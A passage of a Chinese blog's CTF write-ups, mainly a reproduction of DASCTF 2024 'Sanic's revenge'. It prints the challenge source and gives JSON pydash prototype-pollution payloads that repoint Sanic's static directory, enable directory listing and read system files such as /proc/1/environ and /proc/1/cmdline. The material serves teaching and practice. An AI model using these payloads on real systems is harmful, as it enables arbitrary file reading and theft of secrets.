class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>

<p>看到merge函数基本想到的就是python原型链污染</p>
<p>利用merge来动态污染原型链的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;111&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;222&quot;,</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;check&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;__file__&quot; : &quot;/proc/1/environ&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后直接get &#x2F;就好</p>
<p>象征性的复现一下(●’◡’●)</p>
]]></content>
      <categories>
        <category>pollute</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Sanic&#39;s revenge(复现)</title>
    <url>/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>复现这个之前先要学习下python的原型链污染（未学┭┮﹏┭┮）</p>
<p>之前学了Nodejs原型链污染，Python原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。</p>
<p>先看给的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> pydash  </span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)  </span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):  </span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span>  </span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):  </span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):  </span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]  </span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]  </span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:  </span><br><span class="line">        pollute = Pollute()  </span><br><span class="line">        pydash.set_(pollute, key, value)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)  </span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span>  </span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span>  </span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span>  </span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);  </span><br><span class="line">        <span class="comment"># 生成日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="comment"># 备份日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>我们看到Pollute 路由这段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>这是一个处理 <code>/pollute</code> 路径的异步函数 <code>POLLUTE</code>，支持 <code>GET</code> 和 <code>POST</code> 方法。</li>
<li>解析请求的 JSON 数据，获取 <code>key</code> 和 <code>value</code>。</li>
<li>如果条件满足：<ul>
<li>创建一个 <code>Pollute</code> 实例。</li>
<li>使用 <code>pydash.set_</code> 函数 设置 <code>pollute</code> 实例的属性。</li>
<li>返回 “success” 文本。</li>
</ul>
</li>
<li>这个路由还设置了一个waf，如果触发了waf，就会将key和value的值写入&#x2F;tmp目录下的文件中</li>
</ul>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这段json代码就是将file_or_directory设置为”&#x2F;“我的基础还是很薄弱所以我们分析这个payload</p>
<ol>
<li><p><strong><code>__class__</code></strong>: 访问当前对象的类。</p>
</li>
<li><p><strong><code>__init__</code></strong>: 访问类的构造函数。</p>
</li>
<li><p><strong><code>__globals__</code></strong>: 访问构造函数的全局命名空间，这允许攻击者访问应用的全局变量。</p>
</li>
<li><p><strong><code>app.router.name_index.__mp_main__</code></strong>: 试图访问Sanic应用的路由器中的<code>name_index</code>，其中<code>__mp_main__</code>表示模块的名称。</p>
</li>
<li><p><strong><code>.static.handler.keywords.file_or_directory</code></strong>: 最终目标是访问并修改静态文件处理器的<code>file_or_directory</code>属性。</p>
</li>
<li><p><code>&quot;/&quot;</code>: 设置的值为根目录。（补充  ：</p>
<p><code>file_or_directory</code> 这个属性的作用通常是用于指示文件处理器处理的是文件还是目录。攻击者试图通过修改 <code>file_or_directory</code> 属性，将其值设置为 <code>&quot;/&quot;</code>，可能导致服务器将根目录作为静态文件目录，从而暴露服务器上的敏感文件和目录。这种攻击利用了对关键属性缺乏适当验证和保护的漏洞。<br>）就可以实现任意文件读取</p>
</li>
</ol>
<p><img src="/imgs/8.png"></p>
<p>回显success，表面成功了</p>
<p>接着我们访问&#x2F;static&#x2F;proc&#x2F;1&#x2F;cmdline</p>
<p>inux系统中的<code>/proc</code>文件系统的路径，并通过应用的静态文件服务暴露出来</p>
<ul>
<li>**<code>/proc/1/cmdline</code>**：这是一个文件，包含启动进程ID为1的进程时使用的命令行参数。</li>
</ul>
<p><img src="/imgs/9.png"></p>
<p>显示当前的启动路径为&#x2F;bin&#x2F;bash&#x2F;start.sh</p>
<p>我们继续打开这个路径</p>
<p><img src="/imgs/10.png"></p>
<p>发现运行的py脚本</p>
<p><img src="/imgs/11.png"></p>
<p>给了丢失的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#方便管理员查看非法日志</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br></pre></td></tr></table></figure>

<p>他这个给了secret的路径</p>
<p>访问看看</p>
<p><img src="/imgs/12.png"></p>
<p>他说flag在app路由下，但是不知道他的名字 让我们找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br></pre></td></tr></table></figure>

<p>还给了&#x2F;adminLook的路由</p>
<p><img src="/imgs/13.png"></p>
<p>我们传入恶意的key 比如part 这一步很重要到后面来解释</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>传入后我们发现多了两个文件</p>
<p><img src="/imgs/14.png"></p>
<p>有点不一样是因为靶机过期了重新打开了</p>
<p>我们先切换到&#x2F;tmp目录</p>
<p><img src="/imgs/15.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>#对base属性进行污染</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/4KDN4B&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>#打开目录功能</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问static&#x2F;4KDN4B..&#x2F;</p>
<p><img src="/imgs/16.png" alt="image-20240723165717529"></p>
<p>最后得到flag的名字直接访问就好</p>
<p>在把静态文件目录换成为根目录</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>之前知道flag在app路由下</p>
<p>&#x2F;static&#x2F;app&#x2F;45W698WqtsgQT1_flag</p>
<p><img src="/imgs/17.png"></p>
<p>接下来解释上面遗留的问题</p>
<p>那么为什么要恶意操作被后台日志记录呢？</p>
<p>这里复现完了我先把大佬的wp链接放出来，因为我水平有限，基本上就是照着大佬wp来进行复现</p>
<p>有点为了复现而复现的丑陋感，到后面我会慢慢补好基础的┭┮﹏┭┮</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18290489">https://www.cnblogs.com/gxngxngxn/p/18290489</a></p>
<p><a href="https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98">https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98</a></p>
<p><a href="https://blog.csdn.net/2301_79700060/article/details/140632405">https://blog.csdn.net/2301_79700060/article/details/140632405</a></p>
<p><a href="https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502</a></p>
<p>那么我们从</p>
<p>[<strong>gxngxngxn]</strong></p>
<p>大佬的文章来解释下</p>
<p>这套题目其实是ciscn2024 改的一道题目，先放链接</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
<p>国赛 sanic的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>&#x2F;admin 路由那块就是编码成八进制可以进入&#x2F;login,而且需要绕过waf大佬文章都讲了</p>
<p>直接看sanic那块污染链寻找</p>
<p>我们可以污染__file__然后进行任意文件读取，但是我们不知道flag的位置所以可以开启目录功能，有关的两个函数</p>
<p><strong>directory_view</strong> <strong>directory_handler</strong></p>
<p>只要我们将directory污染为根目录，directory_view污染为True，就可以看到根目录的所有文件了</p>
<p>这个框架可以通过**app.router.name_index[‘xxxxx’]**来获取注册的路由</p>
<p>获得这个路由之后我们需要调用到DirectoryHandler里</p>
<p>我们可以用<strong>name_index</strong>方法发现可以从handler入手，一直可以获取到DirectoryHandler中的directory和directory_view</p>
<p>从而实现污染达到列目录的目的</p>
<p>然后接下里就是污染directory</p>
